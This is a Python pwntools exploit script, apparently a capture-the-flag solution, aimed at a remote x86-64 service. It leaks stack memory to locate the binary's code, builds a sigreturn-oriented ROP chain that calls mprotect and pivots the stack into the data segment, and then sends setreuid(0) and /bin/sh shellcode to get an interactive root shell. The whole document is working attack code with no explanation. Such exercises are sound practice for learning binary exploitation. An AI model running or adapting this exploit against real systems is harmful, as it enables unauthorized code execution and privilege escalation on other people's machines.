from pwn import *
import sys

# sycall numbers
MPROTECT = 10
SIGRETURN = 15

context.clear(arch='amd64')
p = remote(sys.argv[1], int(sys.argv[2]))
input("Attach a debugger? ")

print("Leaking ...")

for _ in range(3):
    p.send(b'A' * 8 + b'B' * 8)
    dump = p.recvn(0x200)

print(hexdump(dump))

for i in range(0, len(dump), 8):
    addr = u64(dump[i:i+8])
    # Some heuristics to get the binary .text address from the dump
    if addr & 0xfff == 0 and addr >> 40 == 0x7f and (addr >> 32) & 0xff < 0xf0:
        text_addr = addr
        break

data_addr = text_addr + 0x1000

# Gadgets
inc_rax = text_addr + 0x3c
syscall = text_addr + 0x36

# ROP to mprotect stack
rop = b''
for _ in range(SIGRETURN):
    rop += p64(inc_rax) 
rop += p64(syscall)  # sigretun()

frame = SigreturnFrame()
frame.rip = syscall
frame.rax = MPROTECT
frame.rdi = data_addr
frame.rsi = 0x1000  # Size
frame.rdx = 7  # Protection
frame.r8 =  2  # Set r8 to 2 as to do one more loop
# Stack pivot to .data segment
fake_rsp = data_addr + 0x800
frame.rsp = fake_rsp
frame.rbp = frame.rsp + 0x200 
rop += bytes(frame)

print("Sending mprotect SROP ...")
p.send(rop)
p.recvn(0x200)

sc = asm(shellcraft.amd64.linux.setreuid(0))
sc += asm(shellcraft.amd64.linux.sh())

sc_addr = fake_rsp + 8  # Preceeded by its own address
rop = p64(sc_addr)
rop += sc
print("Sending shellcode ...")
p.send(rop)
p.recvn(0x200)

p.interactive()
